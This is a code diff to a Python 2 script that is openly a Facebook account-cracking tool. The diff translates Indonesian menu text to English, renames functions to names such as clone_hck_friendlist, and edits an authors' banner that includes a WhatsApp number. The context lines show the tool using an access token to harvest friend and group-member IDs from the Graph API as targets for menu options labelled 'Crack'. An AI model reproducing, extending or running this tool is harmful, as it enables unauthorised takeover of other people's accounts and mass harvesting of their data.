@@ -56,9 +56,9 @@ logo = """
 \033[32;1m../`—-’ / …
 \033[32;1m./____ / …BY: Zero & ZxXx-Angel & ZalasXa
 \033[0;1m╔═══════════════════════════════════════════╗
-\033[0;1m║\033[33;1m* \033[34;1mGithub  \033[1;93m: \033[0;1mhttps://github.com/Zero-ZxXxAngel  \033[1;93m                   
-\033[0;1m║\033[33;1m* \033[34;1mYT  \033[1;93m    : \033[0;1m\033[4mYotube/Zero\033[0m \033[1;93m                  
-\033[0;1m║\033[33;1m* \033[34;1mWhatsApp  \033[1;93m : \033[0;1m\033[4m+6285320091382\033[0m \033[1;93m       
+\033[0;1m║\033[33;1m* \033[34;1mInstagram  \033[1;93m: \033[0;1mzero_xvip  \033[1;93m                   
+\033[0;1m║\033[33;1m* \033[34;1mFacebook   \033[1;93m    : \033[0;1m\033[4mZero\033[0m \033[1;93m                  
+\033[0;1m║\033[33;1m* \033[34;1mWhatsApp   \033[1;93m : \033[0;1m\033[4m+6285320091382\033[0m \033[1;93m       
 \033[0;1m╚═══════════════════════════════════════════╝
 """
 
@@ -152,7 +152,7 @@ def login():
 				os.system('xdg-open https://www.instagram.com/zero_xvip')
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+				print"\n\033[1;96m[!] \x1b[1;91mNo connection"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mAccount checkpoint")
@@ -240,11 +240,11 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[32;1m1.\x1b[0;1m Crack dari Friendlist"
-	print "\x1b[32;1m2.\x1b[0;1m Crack dari Friend of friend"
-	print "\x1b[32;1m3.\x1b[0;1m Crack dari member grup"
-	print "\x1b[32;1m4.\x1b[0;1m Crack dari file"
-	print "\n\x1b[32;1m0.\x1b[33;1m Kembali"
+	print "\x1b[32;1m1.\x1b[0;1m Crack hck Friendlist"
+	print "\x1b[32;1m2.\x1b[0;1m Crack hck Friend of friend"
+	print "\x1b[32;1m3.\x1b[0;1m Crack hck member grup"
+	print "\x1b[32;1m4.\x1b[0;1m Crack hck file"
+	print "\n\x1b[32;1m0.\x1b[33;1m Back"
 	pilih_super()
 
 def pilih_super():
@@ -272,9 +272,9 @@ def pilih_super():
 			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mFriend's Name\033[1;91m :\033[0;1m "+op["name"]
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mFriend no found!"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✓] \033[32;1mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✓] \033[32;1mTake ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -290,7 +290,7 @@ def pilih_super():
 			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mGroup's Name \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mGroup no found"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
 		jalan('\033[1;96m[✺] \033[1;93mTake ID \033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
@@ -586,7 +586,7 @@ def clone():
 		print "\033[1;96m[!] \x1b[1;91mIs worng"
 		
 
-def clone_dari_daftar_teman():
+def clone_hck_friendlist():
 	global toket
 	os.system('reset')
 	try:
@@ -652,7 +652,7 @@ def clone_dari_daftar_teman():
 	menu()
 		
 
-def clone_dari_teman():
+def clone_hck_friend():
 	global toket
 	os.system('clear')
 	try:
@@ -726,7 +726,7 @@ def clone_dari_teman():
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 	
-def clone_dari_member_group():
+def clone_hck_member_group():
 	global toket
 	os.system('clear')
 	try:
@@ -801,7 +801,7 @@ def clone_dari_member_group():
 	menu()
 	
 
-def clone_dari_file():
+def clone_hck_file():
 	global toket
 	os.system('clear')
 	try:
